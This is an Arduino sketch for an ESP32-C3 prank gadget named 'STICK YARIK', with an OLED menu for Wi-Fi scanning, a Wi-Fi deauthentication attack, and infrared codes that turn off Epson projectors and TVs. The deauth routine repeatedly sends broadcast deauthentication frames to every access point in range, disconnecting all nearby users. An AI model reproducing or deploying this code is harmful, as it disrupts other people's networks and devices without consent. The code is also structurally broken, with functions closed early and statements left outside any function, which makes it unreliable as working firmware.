#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <IRremote.h>

#define SDA_PIN 5
#define SCL_PIN 6
#define UP_BTN 0
#define SEL_BTN 1
#define DW_BTN 2
#define BACK_BTN 3
#define IR_TX_PIN 4

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

IRsend irsend(IR_TX_PIN);

const char* menuItems[] = {
  "Wi-Fi Scan",
  "Deauth",
  "IR Epson OFF",
  "IR TV OFF",
  "Info"
};
const int MENU_SIZE = 5;
int menuIndex = 0;
bool deauthRunning = false;
unsigned long lastDeauth = 0;

void setup() {
  Serial.begin(115200);
  pinMode(UP_BTN, INPUT_PULLUP);
  pinMode(SEL_BTN, INPUT_PULLUP);
  pinMode(DW_BTN, INPUT_PULLUP);
  pinMode(BACK_BTN, INPUT_PULLUP);
}
Wire.begin(SDA_PIN, SCL_PIN);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("SSD1306 fail");
    for (;;);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("STICK YARIK");
  display.println("Booting...");
  display.display();
  delay(1000);

  irsend.begin();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  drawMenu();
}

void loop() {
  handleButtons();
  if (deauthRunning) runDeauth();
}

void handleButtons() {
  if (digitalRead(UP_BTN) == LOW) {
    menuIndex--;
    if (menuIndex < 0) menuIndex = MENU_SIZE - 1;
    drawMenu();
    delay(200);
  }
}
if (digitalRead(DW_BTN) == LOW) {
    menuIndex++;
    if (menuIndex >= MENU_SIZE) menuIndex = 0;
    drawMenu();
    delay(200);
  }
  if (digitalRead(SEL_BTN) == LOW) {
    selectMenuItem();
    delay(200);
  }
  if (digitalRead(BACK_BTN) == LOW) {
    deauthRunning = false;
    drawMenu();
    delay(200);
  }
}

void drawMenu() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("== STICK YARIK ==");
  for (int i = 0; i < MENU_SIZE; i++) {
    display.print(i == menuIndex ? "> " : "  ");
    display.println(menuItems[i]);
  }
  display.display();
}

void selectMenuItem() {
  switch (menuIndex) {
    case 0: scanWiFi(); break;
    case 1: startDeauth(); break;
    case 2: sendEpsonOff(); break;
    case 3: sendTVOff(); break;
    case 4: showInfo(); break;
  }
}

void scanWiFi() {
  int n = WiFi.scanNetworks();
  display.clearDisplay();
  display.setCursor(0, 0);
  display.print("Found: ");
  display.println(n);
  for (int i = 0; i < n && i < 5; i++) {
    display.print(WiFi.SSID(i));
    display.print(" ");
    display.println(WiFi.RSSI(i));
  }
  display.display();
  delay(4000);
  drawMenu();
}

void startDeauth() {
  deauthRunning = true;
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Deauth ON");
  display.println("BACK to stop");
  display.display();
}

void runDeauth() {
  if (millis() - lastDeauth < 1000) return;
  lastDeauth = millis();
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    int ch = WiFi.channel(i);
    uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x3A, 0x01,
      0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
      0x00,0x00,0x01,0x00
    };
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  }
}

void sendEpsonOff() {
  irsend.sendNEC(0xC1AA09F6, 32);
  delay(500);
  drawMenu();
}

void sendTVOff() {
  irsend.sendNEC(0x20DF10EF, 32);
  delay(500);
  drawMenu();
}

void showInfo() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("STICK YARIK");
  display.println("ESP32-C3");
  display.print("Heap: ");
  display.println(ESP.getFreeHeap());
  display.display();
  delay(3000);
  drawMenu();
}
